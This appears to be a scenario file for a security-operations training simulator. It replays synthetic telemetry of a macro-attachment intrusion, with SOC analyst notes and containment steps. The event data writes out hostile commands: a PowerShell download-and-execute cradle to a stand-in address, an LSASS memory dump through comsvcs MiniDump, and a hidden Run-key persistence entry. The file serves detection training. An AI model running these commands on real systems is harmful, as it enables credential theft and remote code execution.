slug: suspicious-powershell-to-credential-access
title: Suspicious PowerShell to Credential Access
summary: >
  A macro-enabled attachment starts a command shell, PowerShell runs an encoded command and pulls a
  second stage, then the authentication process is dumped and a Run key is planted. Watch the
  telemetry arrive, the detections fire, the alerts escalate, the MITRE map light up and the
  analyst contain the host, all in about eighty seconds.
duration_seconds: 80
start_clock: "09:14:00"
host: WKS-014
user: 'CORP\jdoe'

events:
  # Background: an ordinary desktop
  - t: 1
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Program Files\Google\Chrome\Application\chrome.exe', ParentImage: 'C:\Windows\explorer.exe', CommandLine: '"C:\Program Files\Google\Chrome\Application\chrome.exe"', IntegrityLevel: Medium}
  - t: 3
    category: dns_query
    host: WKS-014
    fields: {src_ip: 10.20.4.31, query: www.example.org, record_type: A, rcode: NOERROR}
  - t: 5
    category: firewall
    host: fw-edge-01
    fields: {src_ip: 10.20.4.31, dst_ip: 192.0.2.80, dst_port: 443, proto: TCP, action: allow, bytes: 5120}
  - t: 8
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE', ParentImage: 'C:\Windows\explorer.exe', CommandLine: '"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"', IntegrityLevel: Medium}
    note: The user's mail client.

  # The attachment is opened
  - t: 11
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE', ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE', CommandLine: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\jdoe\Downloads\Invoice_Q3.docm"', IntegrityLevel: Medium}
    note: Word opens a macro-enabled attachment from the user's Downloads folder.
  - t: 16
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Windows\System32\cmd.exe', ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE', CommandLine: 'cmd.exe /c powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACAAcwBpAG0AdQBsAGEAdABpAG8AbgAnAA== ', IntegrityLevel: Medium}
    note: Word starts a command shell. Documents do not normally do this.
  - t: 19
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, ParentImage: 'C:\Windows\System32\cmd.exe', CommandLine: 'powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACAAcwBpAG0AdQBsAGEAdABpAG8AbgAnAA== ', IntegrityLevel: Medium}
    note: Hidden window and an encoded command. The Base64 decodes to a harmless Write-Output line.
  - t: 23
    category: dns_query
    host: WKS-014
    fields: {src_ip: 10.20.4.31, query: stage.cdn-lab.example, record_type: A, rcode: NOERROR}
    note: The workstation resolves an unfamiliar name.
  - t: 25
    category: firewall
    host: fw-edge-01
    fields: {src_ip: 10.20.4.31, dst_ip: 198.51.100.10, dst_port: 80, proto: TCP, action: allow, bytes: 18344}
    note: An outbound connection to the resolved documentation-range address.
  - t: 28
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, ParentImage: 'C:\Windows\System32\cmd.exe', CommandLine: 'powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString(''http://198.51.100.10/stage2.ps1''))"', IntegrityLevel: Medium}
    note: A download-and-execute cradle. Nothing is fetched because the address is synthetic.
  - t: 32
    category: ps_script
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {ScriptBlockText: "$blob = [Convert]::FromBase64String('Q3liZXJGb3JnZSBsYWIgc2ltdWxhdGlvbiAtIGhhcm1sZXNz'); Invoke-Expression ([Text.Encoding]::UTF8.GetString($blob))"}
    note: Script-block logging records the decoded logic even though the command line was encoded.

  # More background
  - t: 36
    category: dns_query
    host: WKS-014
    fields: {src_ip: 10.20.4.31, query: updates.vendor.example, record_type: A, rcode: NOERROR}
  - t: 38
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Windows\System32\svchost.exe', ParentImage: 'C:\Windows\System32\services.exe', CommandLine: 'C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule', IntegrityLevel: System}

  # Credential access
  - t: 41
    category: process_creation
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Windows\System32\rundll32.exe', ParentImage: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\d.dmp full', IntegrityLevel: High}
    note: A memory dump of process 704, which is the authentication process in this simulation.
  - t: 42
    category: process_access
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {SourceImage: 'C:\Windows\System32\rundll32.exe', TargetImage: 'C:\Windows\System32\lsass.exe', GrantedAccess: '0x1410'}
    note: rundll32 opens the authentication process with read-memory rights.

  # Persistence
  - t: 49
    category: registry_set
    host: WKS-014
    user: 'CORP\jdoe'
    fields: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', TargetObject: 'HKU\S-1-5-21-3000\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync', Details: 'powershell.exe -w hidden -File C:\Users\jdoe\AppData\Roaming\sync.ps1'}
    note: Persistence through a Run key that relaunches a hidden script at every logon.
  - t: 53
    category: dns_query
    host: WKS-014
    fields: {src_ip: 10.20.4.31, query: www.example.org, record_type: A, rcode: NOERROR}

notes:
  - {t: 18, analyst: SOC-Tier1, body: "WINWORD.EXE started cmd.exe on WKS-014. The user opened Invoice_Q3.docm from Downloads a few seconds earlier: a macro is the likely trigger."}
  - {t: 22, analyst: SOC-Tier1, body: "Encoded, hidden PowerShell launched from the same shell. Decoding the Base64 (UTF-16LE) gives a harmless Write-Output; in a real case the payload would be the next thing to read."}
  - {t: 30, analyst: SOC-Tier1, body: "A download cradle against 198.51.100.10 (stage.cdn-lab.example). Adding both to the hunt list. No other host has resolved the name so far."}
  - {t: 44, analyst: SOC-Tier2, body: "LSASS memory was accessed by rundll32 via comsvcs MiniDump. Treat every credential in memory on WKS-014 as exposed and escalate to critical."}
  - {t: 51, analyst: SOC-Tier2, body: "A Run key was added for persistence. The same script path will need to be removed after containment."}
  - {t: 60, analyst: SOC-Tier2, body: "Host isolated. Preserving the memory image and the dropped files before any clean-up."}

containment:
  - {t: 0, state: monitoring, label: Monitoring, detail: No containment in place.}
  - {t: 46, state: containing, label: Containing, detail: "Isolation requested for WKS-014 through the EDR agent."}
  - {t: 58, state: contained, label: Contained, detail: "WKS-014 is isolated from the network; memory and disk are preserved."}
  - {t: 66, state: contained, label: "Contained, credentials reset", detail: "jdoe and accounts that logged on to WKS-014 have been reset; sessions revoked."}
